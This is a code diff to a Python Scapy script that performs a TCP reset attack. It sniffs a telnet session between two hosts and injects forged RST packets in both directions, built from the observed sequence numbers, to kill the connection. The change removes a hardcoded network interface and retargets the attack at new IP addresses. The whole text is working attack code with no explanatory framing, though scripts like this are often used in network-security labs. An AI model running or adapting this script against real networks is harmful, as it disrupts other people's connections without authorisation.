@@ -26,8 +26,8 @@ def tcp_monitor_callback(pkt):
 
 	a = Ether(src=source_mac, dst=destination_mac)/IP(src=source_ip,dst=destination_ip)/TCP(dport=destination_port,sport=source_port,flags=4,seq=seq_sn)
 	b = Ether(src=destination_mac, dst=source_mac)/IP(src=destination_ip,dst=source_ip)/TCP(dport=source_port,sport=destination_port,flags=4,seq=ack_sn)
-	sendp(a, iface='eno33554944', verbose=False)
-	sendp(b, iface='eno33554944', verbose=False)
+	sendp(a, verbose=False)
+	sendp(b, verbose=False)
 	
 def tcp_reset(src_ip, dst_ip, dst_port, src_port = None):
 
@@ -36,7 +36,7 @@ def tcp_reset(src_ip, dst_ip, dst_port, src_port = None):
 	else:
 		match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
 	print(match)
-	sniff(prn=tcp_monitor_callback, filter=match, store=0, iface='eno33554944')
+	sniff(prn=tcp_monitor_callback, filter=match, store=0)
 
 if __name__ == "__main__":
-	tcp_reset('202.100.1.2', '202.100.1.1', '23')
+	tcp_reset('172.16.1.103', '192.168.220.135', '23')
